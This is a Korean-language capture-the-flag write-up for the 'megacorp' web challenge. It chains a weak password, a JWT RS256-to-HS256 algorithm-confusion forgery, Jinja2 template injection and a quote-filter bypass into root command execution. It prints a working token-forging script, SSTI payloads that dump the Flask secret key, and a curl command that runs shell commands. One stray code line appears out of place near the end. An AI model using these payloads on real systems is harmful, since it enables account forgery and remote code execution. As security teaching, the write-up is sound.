# megacorp (EHAX CTF 2026)

---

- **Name:** megacorp
- **Category:** Web
- **Difficulty:** ★★★☆☆ (416 points, 66 solves / 887 teams)
- **Connection:** `http://chall.ehax.in:7801`
- **Flag format:** `EH4X{...}`

---

### 개요

Flask로 만든 가짜 기업 포털입니다.
JWT 토큰으로 인증하고, 프로필 페이지에서 여러 기능을 제공합니다.

세 단계를 거쳐 플래그에 도달합니다.

```
약한 자격증명 → JWT 알고리즘 혼동 → SSTI → RCE → 플래그
```

---

### 소스 분석

#### 1단계 — 로그인

HTML 소스를 열면 힌트가 보입니다.

```html
<!-- did you check for sql injection? just kidding, there is none here -->
```

입력창 placeholder에 `alice`가 적혀 있습니다.
흔한 비밀번호를 시도해봅니다.

```bash
curl -X POST "http://chall.ehax.in:7801/login" \
  -d "username=alice&password=password123" -v
```

302 리다이렉트, 로그인 성공입니다.

발급된 JWT 쿠키를 디코딩하면:

```json
Header:  {"alg": "RS256", "typ": "JWT"}
Payload: {"username": "alice", "role": "user"}
```

RS256 알고리즘에 role이 `"user"`입니다.
`"sysadmin"`이 필요합니다.

#### 2단계 — 숨겨진 엔드포인트 탐색

`ffuf`로 경로를 스캔해도 `/login`, `/profile`, `/fetch`밖에 없습니다.
수동으로 더 시도해보면 하나가 걸립니다.

```
GET /pubkey → 200 OK
```

서버가 **RSA 공개 키를 그대로 노출**하고 있습니다.

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsNmqnDkCDNBFWmWQ3ZsA
...
-----END PUBLIC KEY-----
```

이게 왜 중요한지는 바로 이어서 나옵니다.

### 취약점 분석

#### JWT 알고리즘 혼동 (RS256 → HS256)

JWT 서명 방식을 정리하면 이렇습니다.

| 알고리즘 | 서명 | 검증 |
|----------|------|------|
| RS256 | 비밀키(private key) | 공개키(public key) |
| HS256 | 비밀키(secret) | 같은 비밀키 |

서버는 RS256을 사용합니다.
비밀키로 서명하고, 공개키로 검증합니다.

취약한 JWT 라이브러리는 내부적으로 이렇게 동작합니다.

```python
# alg 헤더를 그대로 신뢰하는 취약한 코드
jwt.decode(token, public_key, algorithms=["RS256", "HS256"])
```

토큰의 `alg`가 `"HS256"`이면, 서버는 `public_key`를
HMAC 비밀키로 사용해서 검증합니다.

공개키는 `/pubkey`에서 이미 가져왔습니다.
공개키로 HS256 서명을 만들면, 서버가 그걸 정상 토큰으로 받아들입니다.

```python
import hmac, hashlib, base64, json

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

with open("pubkey.pem", "rb") as f:
    pubkey = f.read()

header = b64url_encode(
    json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
)
payload = b64url_encode(
    json.dumps({"username": "alice", "role": "admin"}).encode()
)
signing_input = f"{header}.{payload}".encode()
sig = b64url_encode(
    hmac.new(pubkey, signing_input, hashlib.sha256).digest()
)
forged_token = f"{header}.{payload}.{sig}"
```

위조된 토큰으로 접속하면:

```
user-tag: sysadmin_root  ✅
SSTI: ENABLED            ✅
```

#### SSTI — bio 필드

sysadmin 권한에서 bio 필드가 Jinja2 템플릿을 평가합니다.

```
bio = {{ 7*7 }}  →  49  ✅
```

Flask 설정을 읽어봅니다.

```
bio = {{ config.items()|list }}
→ SECRET_KEY = 'megacorp#34af3afca3dad124zsxae'
```

#### RCE — 따옴표 필터 우회

서버가 `"`, `'` 따옴표를 필터링합니다.
`os.popen("id")`처럼 직접 쓸 수 없습니다.

대신 `request.args`를 통해 URL 파라미터로 문자열을 넘깁니다.

```bash
curl -b "token=$ADMIN_TOKEN" \
  -X POST "http://chall.ehax.in:7801/profile?m=subprocess&c=id" \
  --data-urlencode \
  'bio={{lipsum.__globals__.import_string(request.args.m).check_output(request.args.c,shell=True)}}'
```

응답:

```
b'uid=0(root) gid=0(root) groups=0(root)\n'
```

root RCE입니다.

def http_get(path, cookie=None):

### 요약

세 가지 취약점이 체이닝됩니다.

**1. JWT 알고리즘 혼동:**
서버가 `alg` 헤더를 신뢰해 RS256/HS256 둘 다 허용합니다.
노출된 공개 키를 HS256 비밀키로 써서 토큰을 위조합니다.

**2. Jinja2 SSTI:**
sysadmin 권한에서 bio 필드가 템플릿 표현식을 평가합니다.

**3. 따옴표 필터 우회 → RCE:**
`request.args`로 문자열을 URL 파라미터로 우회해
root 권한의 임의 명령 실행에 도달합니다.

JWT를 사용할 때는 허용 알고리즘을 반드시 고정해야 합니다.
`alg` 헤더를 신뢰하는 순간, 공개 키가 서명 위조의 도구가 됩니다.
